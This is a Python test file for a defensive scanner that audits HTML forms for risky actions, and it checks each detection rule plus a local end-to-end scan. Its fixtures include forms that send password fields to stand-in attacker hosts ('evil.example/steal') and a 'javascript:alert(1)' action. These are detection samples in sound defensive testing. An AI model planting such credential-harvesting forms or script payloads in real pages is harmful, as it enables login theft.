"""Tests for the HTML Form Action Auditor's Security Engine and rules.

Rule-level tests use synthetic response dicts with pre-parsed 'forms' lists
(no network calls). The engine-level tests spin up a REAL local HTTP
server (Python's http.server, on an ephemeral localhost port) serving REAL
HTML with forms, and perform a REAL HTTP request + REAL BeautifulSoup
parse against it via the actual ScanEngine code path — genuine end-to-end
testing without touching any third-party site. No form is ever submitted.
"""
import sys
import os
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from app.security_engine import ScanEngine, _extract_forms
from app.detection_rules import (
    rule_cross_origin_form_action,
    rule_password_form_over_http,
    rule_password_form_uses_get,
    rule_post_form_missing_csrf_hint,
    rule_form_action_dangerous_scheme,
    rule_form_action_missing,
)


def resp(url="https://example.com/", forms=None):
    return {"url": url, "status_code": 200, "forms": forms or []}


def form(raw_action="", resolved_action="https://example.com/submit", scheme="https",
         method="POST", same_origin=True, has_password=False, has_csrf_hint=False):
    return {
        "raw_action": raw_action, "resolved_action": resolved_action, "scheme": scheme,
        "method": method, "same_origin": same_origin, "has_password": has_password,
        "has_csrf_hint": has_csrf_hint,
    }


def test_cross_origin_form_flagged():
    result = rule_cross_origin_form_action(resp(forms=[form(same_origin=False, resolved_action="https://evil.example/submit")]))
    assert len(result) == 1
    assert result[0]["rule_id"] == "FAA-001"


def test_same_origin_form_not_flagged():
    result = rule_cross_origin_form_action(resp(forms=[form(same_origin=True)]))
    assert result == []


def test_password_over_http_flagged_critical():
    result = rule_password_form_over_http(resp(forms=[form(scheme="http", has_password=True)]))
    assert len(result) == 1
    assert result[0]["severity"] == "critical"


def test_password_over_https_not_flagged():
    result = rule_password_form_over_http(resp(forms=[form(scheme="https", has_password=True)]))
    assert result == []


def test_password_with_get_flagged():
    result = rule_password_form_uses_get(resp(forms=[form(method="GET", has_password=True)]))
    assert len(result) == 1
    assert result[0]["rule_id"] == "FAA-003"


def test_password_with_post_not_flagged():
    result = rule_password_form_uses_get(resp(forms=[form(method="POST", has_password=True)]))
    assert result == []


def test_post_form_missing_csrf_flagged():
    result = rule_post_form_missing_csrf_hint(resp(forms=[form(method="POST", has_csrf_hint=False)]))
    assert len(result) == 1
    assert result[0]["rule_id"] == "FAA-004"


def test_post_form_with_csrf_not_flagged():
    result = rule_post_form_missing_csrf_hint(resp(forms=[form(method="POST", has_csrf_hint=True)]))
    assert result == []


def test_javascript_action_flagged():
    result = rule_form_action_dangerous_scheme(resp(forms=[form(raw_action="javascript:alert(1)", scheme="javascript")]))
    assert len(result) == 1
    assert result[0]["rule_id"] == "FAA-005"


def test_normal_action_not_flagged_as_dangerous():
    result = rule_form_action_dangerous_scheme(resp(forms=[form(scheme="https")]))
    assert result == []


def test_missing_action_flagged():
    result = rule_form_action_missing(resp(forms=[form(raw_action="")]))
    assert len(result) == 1
    assert result[0]["rule_id"] == "FAA-006"


def test_present_action_not_flagged():
    result = rule_form_action_missing(resp(forms=[form(raw_action="/submit")]))
    assert result == []


def test_extract_forms_from_real_html():
    html = """
    <html><body>
      <form action="/login" method="POST">
        <input type="password" name="pw">
        <input type="hidden" name="csrf_token" value="abc">
      </form>
      <form action="http://evil.example/steal" method="GET">
        <input type="password" name="pw2">
      </form>
    </body></html>
    """
    forms = _extract_forms(html, "https://example.com/page")
    assert len(forms) == 2
    assert forms[0]["has_password"] is True
    assert forms[0]["has_csrf_hint"] is True
    assert forms[0]["same_origin"] is True
    assert forms[1]["same_origin"] is False
    assert forms[1]["scheme"] == "http"


class _Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        body = """
        <html><body>
          <form action="http://external-site.invalid/steal" method="GET">
            <input type="password" name="pw">
          </form>
          <form method="POST">
            <input type="text" name="q">
          </form>
        </body></html>
        """
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(body.encode())

    def log_message(self, format, *args):
        pass


def _start_test_server():
    server = HTTPServer(("127.0.0.1", 0), _Handler)
    port = server.server_port
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server, port


def test_real_engine_against_local_test_server():
    """Genuine end-to-end HTTP test: real request, real HTML, real parsed
    forms, real findings — against a local server we control (not a third
    party). No form is ever submitted."""
    server, port = _start_test_server()
    try:
        time.sleep(0.2)
        engine = ScanEngine(f"http://127.0.0.1:{port}/", timeout=5)
        result = engine.run()
        assert result["response"]["status_code"] == 200
        assert len(result["response"]["forms"]) == 2
        rule_ids = {f["rule_id"] for f in result["findings"]}
        assert "FAA-001" in rule_ids  # cross-origin form action
        assert "FAA-003" in rule_ids  # password form using GET
        assert "FAA-004" in rule_ids  # POST form missing CSRF hint
        assert "FAA-006" in rule_ids  # second form has no action attribute
    finally:
        server.shutdown()


def test_engine_handles_unreachable_target_gracefully():
    engine = ScanEngine("http://127.0.0.1:1/", timeout=2)
    result = engine.run()
    assert result["errors_count"] >= 1
    assert any(f["rule_id"] == "FAA-000" for f in result["findings"])
